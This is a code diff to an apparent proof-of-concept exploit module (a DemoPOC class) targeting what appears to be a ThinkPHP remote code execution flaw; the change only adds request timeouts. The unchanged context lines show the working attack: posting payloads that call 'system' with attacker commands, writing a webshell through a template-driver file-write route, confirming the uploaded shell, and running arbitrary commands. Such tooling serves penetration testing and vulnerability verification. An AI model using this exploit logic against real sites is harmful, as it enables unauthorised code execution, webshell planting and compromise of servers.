@@ -55,7 +55,7 @@ class DemoPOC(POCBase):
         ]
         for payload in payloads:
             vul_url = url + payload
-            r = requests.post(vul_url, data=data)
+            r = requests.post(vul_url, data=data, timeout=15)
 
             if flag in r.text:
                 return payload, dict(data)
@@ -83,8 +83,8 @@ class DemoPOC(POCBase):
                                                                                  content=quote(webshell))
             data["vars[0]"] = "system"
             vulurl = self.url + p[0]
-            requests.post(vulurl, data=data)
-            r = requests.get(self.url + "/" + filename)
+            requests.post(vulurl, data=data, timeout=15)
+            r = requests.get(self.url + "/" + filename,timeout=10)
             if r.status_code == 200 and "green day" in r.text:
                 result['ShellInfo'] = {}
                 result['ShellInfo']['URL'] = self.url + "/" + filename
@@ -92,8 +92,8 @@ class DemoPOC(POCBase):
         if not result:
             vulurl = self.url + r"/index.php?s=index/\think\template\driver\file/write&cacheFile={filename}&content={content}"
             vulurl = vulurl.format(filename=filename, content=quote(webshell))
-            requests.get(vulurl)
-            r = requests.get(self.url + "/" + filename)
+            requests.get(vulurl,timeout=10)
+            r = requests.get(self.url + "/" + filename,timeout=10)
             if r.status_code == 200 and "green day" in r.text:
                 result['ShellInfo'] = {}
                 result['ShellInfo']['URL'] = self.url + "/" + filename
@@ -110,7 +110,7 @@ class DemoPOC(POCBase):
             data["vars[0]"] = "system"
             data["vars[1][]"] = cmd
             vulurl = self.url + p[0]
-            requests.post(vulurl, data=data)
+            requests.post(vulurl, data=data, timeout=15)
 
     def parse_output(self, result):
         output = Output(self)
